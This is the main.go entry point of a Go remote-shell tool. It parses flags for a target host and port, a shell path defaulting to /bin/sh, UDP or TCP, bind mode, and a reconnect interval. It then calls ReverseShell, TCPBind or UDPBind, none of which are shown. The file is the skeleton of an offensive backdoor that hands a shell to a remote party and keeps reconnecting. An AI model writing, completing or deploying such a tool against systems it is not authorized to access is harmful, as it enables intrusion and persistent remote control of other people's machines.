package main

import (
	"time"
    "flag"
)

type Config struct {
	Address 	string
	Shell		string
	Proto		string
	Reconnect 	time.Duration
}

func main() {
	var config Config
	var host, port, reconnect string
	var udp, bind bool

    flag.StringVar(&host, "host", "127.0.0.1", "Host")
	flag.StringVar(&port, "port", "1234", "Port")
	flag.StringVar(&config.Shell, "shell", "/bin/sh", "Unix Shell")
	flag.BoolVar(&udp, "u", false, "Enable UDP")
	flag.BoolVar(&bind, "l", false, "Bind mode")
	flag.StringVar(&reconnect, "recon", "15s", "Reconnecting Time")
    flag.Parse()

	config.Address = host + ":" + port
	config.Reconnect, _ = time.ParseDuration(reconnect)

	if udp {
		config.Proto = "udp"
	} else {
		config.Proto = "tcp"
	}

	if bind {
		if udp {
			UDPBind(config)
		} else {
			TCPBind(config)
		}
	} else {
		ReverseShell(config)
	}
}